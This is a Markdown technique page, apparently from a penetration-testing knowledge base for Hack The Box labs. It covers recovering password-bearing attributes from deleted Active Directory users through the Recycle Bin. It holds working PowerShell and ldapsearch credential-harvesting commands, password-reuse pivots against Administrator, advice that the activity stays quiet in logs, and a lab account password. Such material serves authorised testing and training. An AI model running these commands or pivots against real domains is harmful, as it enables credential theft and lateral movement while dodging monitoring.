# AD Recycle Bin Enumeration

> Recover attribute data from "deleted" AD objects via the Recycle Bin
> tombstone container. Tombstoned objects retain their attributes —
> often including secrets the box's authors expect you to ignore.

## Objective
Read attributes (including custom or password-bearing ones) from
deleted AD users / groups / computers.

## When To Use
- Authenticated AD access.
- BloodHound shows `MemberOf -> AD Recycle Bin` for your principal,
  *or* you have `Read` on `CN=Deleted Objects,DC=...,DC=...`.
- A user appears to be missing from current LDAP results but referenced
  in older artefacts.

## Detection Indicators
- `Get-ADObject` cmdlet works with `-IncludeDeletedObjects`.
- `LDAP_SERVER_SHOW_DELETED_OID` (1.2.840.113556.1.4.417) extension
  control is supported by the server.

## Enumeration Strategy

### From a Windows shell (preferred)

```powershell
# requires RSAT / ActiveDirectory module
Import-Module ActiveDirectory

# enumerate deleted user objects with all attributes
Get-ADObject -SearchBase "CN=Deleted Objects,DC=cascade,DC=local" \
  -ldapFilter "(objectClass=user)" \
  -IncludeDeletedObjects \
  -Properties * \
  | Select-Object Name,sAMAccountName,DisplayName,description,objectSid,cascadeLegacyPwd,whenChanged,whenDeleted
```

### From Linux

```bash
# ldapsearch with the show-deleted control
ldapsearch -x -H ldap://<ip> -D '<dom>\<user>' -w '<pass>' \
  -b "CN=Deleted Objects,DC=cascade,DC=local" \
  -E '!1.2.840.113556.1.4.417' \
  '(objectClass=user)' '*' '+'
```

The `!` prefix marks the control as critical; `1.2.840.113556.1.4.417`
is `LDAP_SERVER_SHOW_DELETED_OID`.

## Exploitation Workflow

1. Authenticate with any cred that has read on Deleted Objects (or is a
   member of `AD Recycle Bin` group).
2. Enumerate every deleted user.
3. Read every attribute — tombstones retain custom ones.
4. Look for password fields, description fields, custom attributes.
5. Correlate against current users for password reuse.

## Commands

```bash
# Cascade-style: pull cascadeLegacyPwd from deleted users
ldapsearch -x -H ldap://<ip> -D 'cascade.local\arksvc' -w 'w3lc0meFr31nd' \
  -b "CN=Deleted Objects,DC=cascade,DC=local" \
  -E '!1.2.840.113556.1.4.417' \
  '(objectClass=user)' sAMAccountName cascadeLegacyPwd
```

```powershell
# convenience helper
function Get-ADRecycleBinUsers {
  Get-ADObject -SearchBase "CN=Deleted Objects,DC=$($env:USERDOMAIN),DC=local" `
    -ldapFilter '(objectClass=user)' -IncludeDeletedObjects -Properties *
}
```

## Tool Usage

- **`Get-ADObject` -IncludeDeletedObjects** — Windows PowerShell with
  RSAT.
- **`ldapsearch -E '!1.2.840.113556.1.4.417'`** — Linux side.
- **PowerView**: not built-in, but custom call via `LDAPSearchRoot`.
- **BloodHound** — does not normally collect deleted objects (you must
  query separately).

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Forgetting the show-deleted control | Empty results | `-E '!1.2.840.113556.1.4.417'` (Linux) or `-IncludeDeletedObjects` (PowerShell) |
| Wrong principal (no rights) | "insufficient access" | Need read on `CN=Deleted Objects,DC=...` |
| Ignoring all-attribute syntax | Miss custom attrs | Include `-Properties *` (PS) or `'*' '+'` (LDAP) |
| Treating tombstone retention as eternal | Newer servers tombstone retention is shorter | Quickly enumerate; data may already be purged after 180 days default |

## Decision-Making Logic

```
have AD cred?
  └─ check membership: AD Recycle Bin group?
       Yes → enumerate Deleted Objects
            └─ look for custom password attributes
            └─ look for descriptions with cleartext
            └─ check for tombstoned admin / privileged accounts
       No  → look for Read ACL on CN=Deleted Objects directly
            (some accounts have it without group membership)
```

## Pivot Opportunities

Deleted users frequently shared passwords with current users. Try:
- The deleted user's password against same-named current users.
- Against `Administrator` / local admins.
- Against AD Recycle Bin group members themselves (sometimes they
  re-use credentials).

## OPSEC Considerations
- Read on `CN=Deleted Objects` is logged with directory service
  auditing, but typically only at DEBUG level — quiet by default.
- Mass enumeration looks like recovery / admin behaviour to most SOCs.

## Real HTB Examples

- **Cascade** — `arksvc` is in `AD Recycle Bin`. The deleted user
  `TempAdmin` has `cascadeLegacyPwd` retained in tombstone; decoded →
  Administrator's password (reuse).

## Alternative Techniques

- **Backup files / NTDS.dit**: an offline NTDS dump includes deleted
  users. If you have any prior NTDS, search there first.
- **AD snapshots**: `ntdsutil` snapshot mounting (post-DA, but
  occasionally available pre-DA via `Backup Operators`).

## Automation Opportunities

```powershell
Get-ADObject -SearchBase "CN=Deleted Objects,$((Get-ADDomain).DistinguishedName)" `
  -ldapFilter '(objectClass=user)' -IncludeDeletedObjects -Properties * `
  | Format-List Name,sAMAccountName,description,cascadeLegacyPwd,*pwd*,*pass*
```

## Checklist

- [ ] Confirm rights to read Deleted Objects
- [ ] Enumerate all deleted users with all attributes
- [ ] Inspect custom attributes for credentials
- [ ] Inspect description fields for cleartext
- [ ] Test extracted creds against current accounts (password reuse)

## Related Skills

- [`active-directory/anonymous-ad-enumeration.md`](anonymous-ad-enumeration.md)
- [`active-directory/bloodhound-usage.md`](bloodhound-usage.md)
- [`active-directory/dcsync.md`](dcsync.md)
- [`enumeration/ldap-enumeration.md`](../enumeration/ldap-enumeration.md)
- [`methodology/09-credential-hunting.md`](../methodology/09-credential-hunting.md)
